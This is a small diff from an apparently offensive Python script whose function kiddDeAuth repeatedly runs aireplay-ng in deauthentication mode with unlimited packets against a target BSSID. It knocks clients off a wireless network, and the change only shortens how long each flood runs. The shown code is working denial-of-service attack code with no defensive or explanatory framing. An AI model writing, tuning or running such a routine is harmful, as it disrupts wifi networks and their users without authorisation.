@@ -27,7 +27,7 @@ def kiddDeAuth( BSSID, interface ):
         time.sleep( 40 )
         print( f"\n\n{ red }I am going to kid the wifi right now!\n\n" )
         p = subprocess.Popen( [ "sudo", "aireplay-ng", "-0", "0", "-a", BSSID, interface ] )
-        time.sleep( 30 )
+        time.sleep( 20 )
         p.terminate()
         p.wait()
         print( f"{ green }\n\nI am going to sleep for a while!\n\n" )
